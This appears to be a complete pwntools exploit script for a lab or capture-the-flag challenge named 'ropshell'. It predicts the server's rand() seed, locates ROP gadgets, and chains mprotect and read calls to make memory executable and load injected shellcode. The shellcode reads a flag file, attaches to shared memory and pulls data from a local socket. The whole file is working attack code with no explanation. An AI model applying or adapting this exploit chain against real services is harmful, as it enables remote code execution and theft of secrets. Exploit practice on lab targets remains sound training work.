#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
import ctypes
libc = ctypes.CDLL('libc.so.6')
from pwn import *
import struct
import numpy as np

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)
r.recvuntil(b'Timestamp is ')
time = int(r.recvline()[:-1])
print(time)
libc.srand(time)
r.recvuntil(b'Random bytes generated at ')
address = int(r.recvline()[:-1], 16)
r.recvline()
print(hex(address))
LEN_CODE = 10*0x10000

codeint = []
for i in range(int(LEN_CODE/4)):
    codeint.append(hex(((libc.rand()<<16) & 0xffffffff) | (libc.rand() & 0xffff)))
LEN_RAND = libc.rand() % (int(LEN_CODE/4) - 1)

index_rax = 0
index_rdi = 0
index_rsi = 0
index_rdx = 0

rax = asm(""" pop rax
        ret """).hex()
rdi = asm(""" pop rdi
        ret """).hex()
rsi = asm(""" pop rsi
        ret """).hex()
rdx = asm(""" pop rdx
        ret """).hex()
# print(rax)
# print(rdi)
# print(rsi)
# print(rdx)
for i in range(int(LEN_CODE/4)):
    if("c358" == codeint[i][-4:]):
        index_rax = i * 4
        break
for i in range(int(LEN_CODE/4)):
    if("c35f" == codeint[i][-4:]):
        index_rdi = i * 4
        break
for i in range(int(LEN_CODE/4)):
    if("c35e" == codeint[i][-4:]):
        index_rsi = i * 4
        break
for i in range(int(LEN_CODE/4)):
    if("c35a" == codeint[i][-4:]):
        index_rdx = i * 4
        break
print(index_rax)
print(index_rdi)
print(index_rsi)
print(index_rdx)
index_rax += address
index_rdi += address
index_rsi += address
index_rdx += address
index_sys = address + LEN_RAND * 4


payload = p64(index_rax)\
        + p64(10)\
        + p64(index_rdi)\
        + p64(address)\
        + p64(index_rsi)\
        + p64(LEN_CODE)\
        + p64(index_rdx)\
        + p64(7)\
        + p64(index_sys)\
        + p64(index_rax)\
        + p64(0)\
        + p64(index_rdi)\
        + p64(0)\
        + p64(index_rsi)\
        + p64(address)\
        + p64(index_rdx)\
        + p64(LEN_CODE)\
        + p64(index_sys)\
        + p64(address)
r.sendafter(b'> ', payload)
shellcode = asm('''
    mov rax, 2
    lea rdi, [rip+filename]
    mov rsi, 0
    mov rdx, 0
    syscall
    mov rdi, rax
    mov rax, 0
    lea rsi, [rsp]
    mov rdx, 80
    syscall
    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    lea rsi, [rsp]
    syscall
    mov rax, 29
    mov rdi, 0x1337
    mov rsi, 0
    mov rdx, 0
    syscall
    mov rdi, rax
    mov rax, 30
    mov rsi, 0
    mov rdx, 0x1000
    syscall
    mov rsi, rax
    mov rax, 1
    mov rdi, 1
    mov rdx, 68
    syscall
    mov rax, 1
    mov rdi, 1
    lea rsi, [rip+newline]
    mov rdx, 1
    syscall
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    mov QWORD PTR [rsp], rax
    mov WORD PTR [rsp+0x8], 0x2
    mov WORD PTR [rsp+0xa], 0x3713
    mov DWORD PTR [rsp+0xc], 0x100007f
    mov rdi, QWORD PTR [rsp]
    mov rax, 42
    lea rsi, [rsp+0x8]
    mov rdx, 16
    syscall 
    mov rax, 45
    lea rsi, [rsp+0x14]
    mov rdx, 0x50
    mov r8, 0
    mov r9, 0
    mov r10, 0
    syscall
    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    lea rsi, [rsp+0x14]
    syscall
    mov rdi, 37
    mov rax, 60
    syscall
filename: .String "/FLAG"
newline: .String "\\n"
''')
r.send(shellcode)
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
